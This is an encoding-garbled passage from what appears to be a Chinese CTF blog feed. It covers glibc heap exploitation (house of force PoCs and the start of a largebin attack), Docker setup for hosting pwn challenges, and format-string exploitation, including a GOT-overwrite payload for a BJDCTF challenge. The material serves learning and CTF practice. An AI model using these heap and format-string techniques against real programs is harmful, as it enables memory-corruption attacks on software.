class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim at %p\n"</span>, (<span class="keyword">void</span>*)victim);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim_chunk at %p\n"</span>, (<span class="keyword">void</span>*)victim_chunk);</span><br><span class="line">stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line">stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"><span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"><span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x110</span>);</span><br><span class="line">victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1;</span><br><span class="line"><span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">read(<span class="number">0</span>,p4,<span class="number">0x100</span>);</span><br><span class="line">read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h3><p>ç®€å•æ¥è¯´ï¼Œåœ¨æ­£å¸¸mallocæœºåˆ¶ä¸­ï¼Œå¦‚æœä½ mallocçš„sizeå¤§äºbinä¸­å­˜å‚¨çš„chunkçš„size æˆ–è€… æ˜¯binä¸ºç©ºï¼Œå°±ä¼šåœ¨top chunkçš„ä½ç½®åˆ†å‰²top chunkã€‚æ€ä¹ˆæ‰¾åˆ°top chunkçš„å‘¢ï¼Œæ˜¯åœ¨å†…å­˜ä¸­å­˜åœ¨ä¸€å¤„æŒ‡é’ˆï¼ŒæŒ‡å‘äº†top chunkçš„ä½ç½®ï¼Œåˆ†å‰²top chunkåchunkçš„è½ç‚¹ä¹Ÿæ˜¯ç”±é‚£ä¸ªæŒ‡é’ˆæŒ‡å®šã€‚</p><p>æŒ‰ç…§ä¸Šè¿°æ„æ€ï¼Œåªè¦æˆ‘ä»¬æ§åˆ¶äº†é‚£ä¸ªtop chunkçš„æŒ‡é’ˆï¼Œæˆ‘ä»¬å°±å¯ä»¥å®ç°ä»»æ„åœ°å€å†™ã€‚</p><p>è¦æƒ³è¾¾æˆhouse of forceï¼Œå°±éœ€è¦ä»¥ä¸‹æ¡ä»¶:</p><p>1.èƒ½å¤Ÿä»¥æº¢å‡ºç­‰æ–¹å¼æ§åˆ¶åˆ° top chunk çš„ size åŸŸ</p><p>2.èƒ½å¤Ÿè‡ªç”±åœ°æ§åˆ¶å †åˆ†é…å°ºå¯¸çš„å¤§å°</p><p>ç¬¬ä¸€ç§ï¼Œå°†top_chunkåœ°å€å‡å°ï¼Œå¾€ä¸Šåˆ†é…</p><p>1.åˆ©ç”¨æº¢å‡ºï¼Œå°†top chunk sizeæ”¹ä¸º-1</p><p>2.è®¡ç®—è·ç¦»ï¼Œæ³¨æ„ ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASKé™åˆ¶ï¼Œä¹Ÿå°±æ˜¯ä½ çš„ç›®æ ‡åœ°å€-top_chunk-SIZE_SZ-MALLOC_ALIGN_MASKã€‚å½“ç„¶ï¼Œè¿™ä¸ªMALLOC_ALIGN_MASKå¯å‡å¯ä¸è§ï¼Œçœ‹æ˜¯å¦å¯¹é½ã€‚</p><p>3.ç›´æ¥è¿›è¡Œå †å—åˆ†é…ã€‚</p><p>è´´poc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> *ptr,*ptr2;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="keyword">long</span> *)(((<span class="keyword">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr=<span class="number">-1</span>;        <span class="comment">// &lt;=== è¿™é‡ŒæŠŠtop chunkçš„sizeåŸŸæ”¹ä¸º0xffffffffffffffff</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">-4120</span>);  <span class="comment">// &lt;=== å‡å°top chunkæŒ‡é’ˆ</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);   <span class="comment">// &lt;=== åˆ†é…å—å®ç°ä»»æ„åœ°å€å†™</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç§ï¼Œå°†top_chunkåœ°å€å¢å¤§ï¼Œå¾€ä¸‹åˆ†é…</p><p>æ“ä½œå’Œä¸Šè¿°æ— å¼‚ï¼Œå°±æ˜¯ç¬¬äºŒæ­¥ï¼Œç›´æ¥ç›®æ ‡åœ°å€-top_chunkå°±å¯äº†ã€‚</p><p>è´´poc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> *ptr,*ptr2;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="keyword">long</span> *)(((<span class="keyword">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr=<span class="number">-1</span>;                 &lt;=== ä¿®æ”¹top chunk size</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">140737345551056</span>); &lt;=== å¢å¤§top chunkæŒ‡é’ˆ</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin_attack"></a>largebin_attack</h2><p>ä¸ºä»€ä¹ˆlargebin_attackéƒ½éœ€è¦æœ‰ä¸¤ä¸ªå †å—åœ¨largebiné‡Œï¼Œé‚£æ˜¯å› ä¸ºï¼Œæ³¨æ„è§‚å¯Ÿæºç ï¼Œå®ƒä¼šå­˜åœ¨ä¸€ä¸ªåˆ¤æ–­</p><p><img src="https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20200508231845173.png" alt></p><p>å¦‚æœfwdä¸ç­‰äºbckï¼Œæ„å‘³ç€large_binä¸­æœ‰ç©ºé—²chunkå­˜åœ¨ï¼Œæ‰€ä»¥æ‰ä¼šè¿›å…¥ä¸‹é¢çš„</p><p><img src="https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20200508231643231.png" alt></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>dockerçš„æ­å»º</title>
      <link href="/2020/03/22/docker%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
      <url>/2020/03/22/docker%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h3 id="æ­£å¸¸çš„dockerå®‰è£…"><a href="#æ­£å¸¸çš„dockerå®‰è£…" class="headerlink" title="æ­£å¸¸çš„dockerå®‰è£…"></a>æ­£å¸¸çš„dockerå®‰è£…</h3><p>ç”±äºaptå®˜æ–¹åº“é‡Œçš„dockerç‰ˆæœ¬å¯èƒ½æ¯”è¾ƒæ—§ï¼Œæ‰€ä»¥å…ˆå¸è½½å¯èƒ½å­˜åœ¨çš„æ—§ç‰ˆæœ¬ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get remove docker docker-engine docker-ce docker.io</span><br></pre></td></tr></table></figure><p>æ›´æ–°aptåŒ…ç´¢å¼•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get update</span><br></pre></td></tr></table></figure><p>å®‰è£…ä»¥ä¸‹åŒ…ä»¥ä½¿aptå¯ä»¥é€šè¿‡HTTPSä½¿ç”¨å­˜å‚¨åº“ï¼ˆrepositoryï¼‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure><p>æ·»åŠ Dockerå®˜æ–¹çš„GPGå¯†é’¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥è®¾ç½®stableå­˜å‚¨åº“ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo add-apt-repository <span class="string">"deb [arch=amd64] https://download.docker.com/linux/ubuntu <span class="variable">$(lsb_release -cs)</span> stable"</span></span><br></pre></td></tr></table></figure><p>å†æ›´æ–°ä¸€ä¸‹aptåŒ…ç´¢å¼•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get update</span><br></pre></td></tr></table></figure><p>å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„Docker CEï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install -y docker-ce</span><br></pre></td></tr></table></figure><p>å¯åŠ¨docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker start</span><br></pre></td></tr></table></figure><p>ç”¨hello worldè¿›è¡ŒéªŒè¯æ˜¯å¦æˆåŠŸå¯åŠ¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure><h3 id="linuxç¯å¢ƒä¸‹pwné¢˜çš„æ­å»º"><a href="#linuxç¯å¢ƒä¸‹pwné¢˜çš„æ­å»º" class="headerlink" title="linuxç¯å¢ƒä¸‹pwné¢˜çš„æ­å»º"></a>linuxç¯å¢ƒä¸‹pwné¢˜çš„æ­å»º</h3><p>è¿™é‡Œè¿ç”¨åˆ°pwn_deploy_chrootã€‚</p><p><a href="https://github.com/giantbranch/pwn_deploy_chroot" target="_blank" rel="noopener">https://github.com/giantbranch/pwn_deploy_chroot</a> &lt;â€“è¿™é‡Œ</p><p>è¿ç”¨è¿™ä¸ªå°±å¯ä»¥ä¸ç”¨ä¸Šè¿°ç¹çæ“ä½œï¼Œä»é›¶å¼€å§‹å¿«é€Ÿå¸ƒç½®ä½ çš„pwné¢˜</p><h4 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£…docker</span></span><br><span class="line">curl ``-``s https:``/``/``get.docker.com``/` `| sh</span><br><span class="line"><span class="comment"># å®‰è£… docker compose å’Œgit</span></span><br><span class="line">apt install docker``-``compose git</span><br><span class="line"><span class="comment"># ä¸‹è½½</span></span><br><span class="line">git <span class="built_in">clone</span> https:``/``/``github.com``/``giantbranch``/``pwn_deploy_chroot.git</span><br></pre></td></tr></table></figure><p>è®°å¾—å…ˆç»™dockeræ¢æºï¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$vim</span> /etc/docker/daemon.json</span><br><span class="line"><span class="comment">#è¾“å…¥ä»¥ä¸‹å†…å®¹</span></span><br><span class="line">&#123; </span><br><span class="line"></span><br><span class="line"><span class="string">"registry-mirrors"</span>: [<span class="string">"https://docker.mirrors.ustc.edu.cn"</span>] </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ›´æ”¹é•œåƒåé‡å¯docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#systemctl restart docker</span></span><br></pre></td></tr></table></figure><h4 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h4><ol><li>å°†æ‰€æœ‰pwné¢˜ç›®æ”¾å…¥binç›®å½•ï¼Œå¯ä»¥1ä¸ªï¼Œä¹Ÿå¯ä»¥nä¸ªï¼ˆæ³¨æ„åå­—ä¸å¸¦ç‰¹æ®Šå­—ç¬¦ï¼Œå› ä¸ºä¼šå°†æ–‡ä»¶åä½œä¸ºlinuxç”¨æˆ·åï¼‰</li><li>python initialize.py</li><li>docker-compose up â€“build -d</li></ol><h5 id="æ³¨ï¼š"><a href="#æ³¨ï¼š" class="headerlink" title="æ³¨ï¼š"></a>æ³¨ï¼š</h5><p>1.æ­¤æ—¶å¯èƒ½ä¼šåœ¨ç¬¬ä¸‰æ­¥å› ä¸ºdockerfileé‡Œé¢çš„è®¾ç½®é—®é¢˜ï¼Œå¯¼è‡´æºæ²¡æ¢æˆåŠŸã€‚æ­¤æ—¶å°±æ‰‹åŠ¨ä¿®æ”¹dockerfileå†…å®¹ï¼ŒåŠ å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RUN  sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">RUN  apt-get clean</span><br><span class="line"></span><br><span class="line">RUN apt-get update</span><br></pre></td></tr></table></figure><p>2.å®ƒä¼šè‡ªåŠ¨éƒ¨ç½²pwné¢˜ï¼Œç«¯å£é»˜è®¤ä»10000ä¾æ¬¡å¢åŠ ã€‚<br>å› ä¸ºæŸxxè¦æ±‚ç«¯å£æ˜¯9999ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä¿®æ”¹ä¸€ä¸‹config.py,æŠŠè¿™é‡Œçš„10000æ”¹æˆ9999ï¼Œç„¶åæŠŠç”¨çš„pwnæ”¾åˆ°biné‡Œ</p><p>3.è¦æƒ³ä¿®æ”¹flagï¼Œå°±åœ¨ç¬¬äºŒæ­¥python initialize.pyåä¿®æ”¹flag.txtï¼Œå†è¿è¡Œä¸€æ¬¡python initialize.py</p><p>okï¼Œæ­¤æ—¶pwné¢˜å·²éƒ¨ç½²å®Œæ¯•ã€‚æ­¤æ—¶å°±å¯ä»¥åˆ°imageå»æŸ¥çœ‹ä¸€ç•ªã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æŸ¥çœ‹å½“å‰è¿è¡Œçš„å®¹å™¨ï¼Œæ‰¾åˆ°å¯¹åº”çš„CONTAINER IDåè¿›å…¥</span></span><br><span class="line">sudo docker ps</span><br><span class="line">sudo docker <span class="built_in">exec</span> -ti &lt;CONTAINER ID&gt; bash</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å®¹å™¨çš„ip,ç”¨ncè¿</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/hosts</span><br></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯ç”¨ä½ çš„expè¿›è¡Œæµ‹è¯•ã€‚</p><h3 id="dockeré•œåƒçš„ä¿å­˜å’Œå¯¼å‡º"><a href="#dockeré•œåƒçš„ä¿å­˜å’Œå¯¼å‡º" class="headerlink" title="dockeré•œåƒçš„ä¿å­˜å’Œå¯¼å‡º"></a>dockeré•œåƒçš„ä¿å­˜å’Œå¯¼å‡º</h3><p>1.æŸ¥çœ‹è¦è¦ä¿å­˜çš„é•œåƒçš„ID</p><p>docker  images</p><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5Cdocker%E7%9A%84%E6%90%AD%E5%BB%BA%5Cimage-20200403110914281.png" alt="image-20200403110914281"></p><p>2.ä¿å­˜é•œåƒä¸ºtaråŒ…</p><p>docker save  -o  gitlab.tar  <repository></repository></p><p>3.ç”¨scpï¼Œxftpç­‰ç­‰å°†å·²ç»å‹ç¼©å¥½çš„gitlab.taråŒ…å¼„åˆ°æœåŠ¡å™¨ï¼Œè™šæ‹Ÿæœºï¼ˆä½ æƒ³å¼„åˆ°çš„åœ°æ–¹ï¼‰</p><p>4.å°†gitlab.taråŒ…å¯¼å‡ºåˆ°æœ¬åœ°æ¥(ä¸€å®šè¦æœ‰dockerçš„è¿è¡Œç¯å¢ƒï¼Œdockerå®‰è£…ï¼š<a href="https://www.jianshu.com/p/9c96ea8e6f41" target="_blank" rel="noopener">https://www.jianshu.com/p/9c96ea8e6f41</a>)</p><p>docker  load  -i  gitlab.tar</p><p>5.è¿è¡Œdockerå®¹å™¨</p><p>docker  run</p><h3 id="åˆ é™¤dockerå®¹å™¨"><a href="#åˆ é™¤dockerå®¹å™¨" class="headerlink" title="åˆ é™¤dockerå®¹å™¨"></a>åˆ é™¤dockerå®¹å™¨</h3><p>1.åˆ—å‡ºæ‰€æœ‰å®¹å™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p>2.åœæ­¢å®¹å™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop &lt;CONTAINER ID&gt;</span><br></pre></td></tr></table></figure><p>3.åˆ é™¤å®¹å™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm &lt;CONTAINER ID&gt;</span><br></pre></td></tr></table></figure><p>4.åˆ é™¤é•œåƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi &lt;id|name&gt;</span><br></pre></td></tr></table></figure><h3 id="dockerå¯åŠ¨"><a href="#dockerå¯åŠ¨" class="headerlink" title="dockerå¯åŠ¨"></a>dockerå¯åŠ¨</h3><p>docker imagesä¸­å·²ç»å­˜åœ¨å…¶é•œåƒï¼Œå¯¹å…¶å¯åŠ¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run my/python:v1 cal <span class="comment">##my/python:v1ä¸ºé•œåƒåå’Œæ ‡ç­¾</span></span><br></pre></td></tr></table></figure><p>å¼€å§‹å®¹å™¨è¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start <span class="variable">$CONTAINER_ID</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²è§£æ</title>
      <link href="/2020/03/10/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90/"/>
      <url>/2020/03/10/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>é€šå¸¸æ¥è¯´ï¼Œæœ€å¸¸è§çš„æ˜¯printfï¼Œé‚£ä¹ˆæˆ‘ä¹Ÿå°±æ ¹æ®printfæ¥è§£æã€‚</p><p>é¦–å…ˆæ¥çœ‹è¯¥å‡½æ•°çš„è°ƒç”¨æ ¼å¼ï¼š</p><p>printf(â€œ&lt;æ ¼å¼åŒ–å­—ç¬¦ä¸²&gt;â€, &lt;å‚é‡è¡¨&gt;)</p><p>å¾ˆå¤šçš„æ—¶å€™ï¼Œé—®é¢˜å…¶å®å‡ºç°åœ¨å‚é‡è¡¨ï¼Œå› ä¸ºåœ¨è¿›å…¥ printf ä¹‹åï¼Œå‡½æ•°é¦–å…ˆè·å–ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¸€ä¸ªä¸€ä¸ªè¯»å–å…¶å­—ç¬¦ä¼šé‡åˆ°ä¸¤ç§æƒ…å†µ</p><p>â€‹    å½“å‰å­—ç¬¦ä¸æ˜¯ %ï¼Œç›´æ¥è¾“å‡ºåˆ°ç›¸åº”æ ‡å‡†è¾“å‡ºã€‚</p><p>â€‹    å½“å‰å­—ç¬¦æ˜¯ %ï¼Œ ç»§ç»­è¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦</p><p>â€‹        å¦‚æœæ²¡æœ‰å­—ç¬¦ï¼ŒæŠ¥é”™</p><p>â€‹        å¦‚æœä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯ %, è¾“å‡º %</p><p>â€‹        å¦åˆ™æ ¹æ®ç›¸åº”çš„å­—ç¬¦ï¼Œè·å–ç›¸åº”çš„å‚æ•°ï¼Œå¯¹å…¶è¿›è¡Œè§£æå¹¶è¾“å‡º</p><h3 id="æ³„éœ²å†…å­˜"><a href="#æ³„éœ²å†…å­˜" class="headerlink" title="æ³„éœ²å†…å­˜"></a>æ³„éœ²å†…å­˜</h3><h4 id="æ³„éœ²æ ˆå†…å­˜"><a href="#æ³„éœ²æ ˆå†…å­˜" class="headerlink" title="æ³„éœ²æ ˆå†…å­˜"></a>æ³„éœ²æ ˆå†…å­˜</h4><p>åˆ©ç”¨%n$pæ¥è·å–æ ˆä¸­çš„æ•°æ®ï¼Œåˆ©ç”¨%n$sè·å–æ ˆå˜é‡å¯¹åº”çš„å­—ç¬¦ä¸²</p><h4 id="æ³„éœ²ä»»æ„åœ°å€å†…å­˜"><a href="#æ³„éœ²ä»»æ„åœ°å€å†…å­˜" class="headerlink" title="æ³„éœ²ä»»æ„åœ°å€å†…å­˜"></a>æ³„éœ²ä»»æ„åœ°å€å†…å­˜</h4><p>åˆ©ç”¨addr%n$sã€‚</p><p>å‡½æ•°ä¼šå…ˆå°†addrå­˜å…¥æ ˆä¸­ï¼Œç„¶åé‡åˆ°%n$så¯¹æ ˆä¸­å­˜æ”¾addrçš„åœ°å€å†…å®¹è¿›è¡Œè§£æï¼Œå› ä¸º%sæ˜¯å°†å¯¹åº”çš„æ ˆä¸­å˜é‡è§†ä¸ºå­—ç¬¦ä¸²å˜é‡ï¼Œè¾“å‡ºå…¶æ•°å€¼å¯¹åº”çš„åœ°å€å¤„çš„å­—ç¬¦ä¸²ã€‚</p><p>æ‰€ä»¥addr%n$sçš„è¿ä½œåŸç†:</p><p>1.addrå…¥æ ˆ</p><p>2.%n$sæ‰¾åˆ°æ ˆä¸­ç¬¬nä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯addrï¼Œå¯¹å…¶æ‰€æŒ‡å‘çš„åœ°å€å¤„çš„å†…å®¹è¿›è¡Œè¾“å‡ºã€‚</p><h3 id="è¦†ç›–å†…å­˜"><a href="#è¦†ç›–å†…å­˜" class="headerlink" title="è¦†ç›–å†…å­˜"></a>è¦†ç›–å†…å­˜</h3><p>%n,ä¸è¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯æŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚</p><p>ä¹Ÿå’Œä¸Šé¢ä¸€æ ·ï¼Œaddr%k$n</p><h4 id="è¦†ç›–å°æ•°å­—"><a href="#è¦†ç›–å°æ•°å­—" class="headerlink" title="è¦†ç›–å°æ•°å­—"></a>è¦†ç›–å°æ•°å­—</h4><p>printf(â€œ[addr]%Dd %N$nâ€)è¿™ç§æ ¼å¼è¾“å‡ºaddrå°±å 4ä¸ªå­—èŠ‚ï¼Œæ‰§è¡Œè¦†ç›–æ—¶æœ€å°å€¼æ˜¯4ï¼Œå¯ä¸å¯ä»¥å°äº4ï¼Ÿ</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†addræ”¾åœ¨åé¢ï¼Œè¿™æ˜¯å¯ä»¥çš„ã€‚</p><p>æ­¤æ—¶printfå˜ä¸ºprintf(â€œxx%k$n[**] [addr]â€) å…¶ä¸­çš„xx, * *å¯ä»¥ä¸ºä»»æ„çš„å­—ç¬¦ã€‚</p><p>xxèµ‹å€¼å‡ å°±å‡ ä¸ªå­—ç¬¦ï¼Œä¾‹å¦‚æ‰“å°2å°±xx%N$nï¼Œç”±äºåˆéœ€è¦æŒ‰å­—èŠ‚å¯¹é½ï¼ˆå¦åˆ™ç¨‹åºä¼šå´©æºƒï¼‰é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦åœ¨$nåé¢è¡¥é½ä¸¤ä¸ªå­—ç¬¦ã€‚</p><p>è¿™ä¸ªæ—¶å€™ï¼Œxx%Næˆä¸ºäº†ç¬¬kä¸ªå‚æ•°ï¼Œ$nxxæˆä¸ºäº†ç¬¬k+1ä¸ªå‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æ­¤æ—¶å¯¹äºprintfçš„åˆ©ç”¨ä¸­Nå°±éœ€è¦å˜æˆN+2</p><p>æ³¨ï¼šå…¶å®ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦æŒæ¡çš„å°æŠ€å·§å°±æ˜¯ï¼Œæˆ‘ä»¬æ²¡æœ‰å¿…è¦å¿…é¡»æŠŠåœ°å€æ”¾åœ¨æœ€å‰é¢ï¼Œæ”¾åœ¨é‚£é‡Œéƒ½å¯ä»¥ï¼Œåªè¦æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å…¶å¯¹åº”çš„åç§»å³å¯ã€‚</p><h5 id="BJDCTF-2nd-r2t4"><a href="#BJDCTF-2nd-r2t4" class="headerlink" title="[BJDCTF 2nd]r2t4"></a>[BJDCTF 2nd]r2t4</h5><p>ä¸€ä¸ªæ ‡å‡†çš„è¦†ç›–å†…å­˜ä¾‹å­ã€‚</p><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæ›´æ”¹<code>__stack_chk_fail</code>çš„gotè¡¨ä¸ºåé—¨å‡½æ•°åœ°å€ã€‚</p><p>payload=â€™%64c%9$hn%1510c%10$hnâ€™+p64(0x601018+2)+p64(0x601018)</p><p>%64c%9$hnæ­¤å¤„æ˜¯ä»¥ä¸¤ä¸ªå­—èŠ‚ä¸ºå•ä½ï¼Œå†™å…¥64ä¸ª</p><p>%1510c%10$hnè¿™é‡Œå†™å…¥çš„å¯ä¸æ˜¯1510ï¼Œè€Œæ˜¯éœ€è¦åŠ ä¸Šå‰é¢%64c%9$hnå†™å…¥çš„64ä¸ªå­—èŠ‚ã€‚</p><h4 id="è¦†ç›–å¤§æ•°å­—"><a href="#è¦†ç›–å¤§æ•°å­—" class="headerlink" title="è¦†ç›–å¤§æ•°å­—"></a>è¦†ç›–å¤§æ•°å­—</h4><p>å…ˆå¯¹Printfä½œä¸€ç‚¹è¡¥å……:</p><p>printf (â€œ%nâ€,a):å½“é‡åˆ°%næ—¶ï¼Œç¨‹åºä¼šæ£€æŸ¥å·²ç»è¾“å…¥äº†å¤šå°‘å­—ç¬¦ä¸²ï¼Œç„¶åå°†å…¶å†™å…¥åˆ°aä¸­ã€‚å¯ä»¥é€šè¿‡è¿™ä¸€ç‚¹æ¥æ”¹å†™æ ˆä¸­å†…å­˜ã€‚</p><p>%nå†™å…¥çš„å†…å­˜æœ€å¤§ä¸º4å­—èŠ‚ã€‚</p><p>%hnå†™å…¥çš„å†…å­˜æœ€å¤§ä¸º2å­—èŠ‚ã€‚</p><p>%hhnå†™å…¥çš„å†…å­˜æœ€å¤§ä¸º1å­—èŠ‚ï¼ˆç”¨äºå°†å¤§å­—èŠ‚æ‹†å¼€å†™ï¼‰ã€‚</p><p>%xdä¾ç„¶ä¼šè¢«ç®—å…¥è¿™ä¸ªç©ºé—´ã€‚</p><p>åˆ©ç”¨fmtstrï¼</p><p>fmtstr_payload(offset, {address: 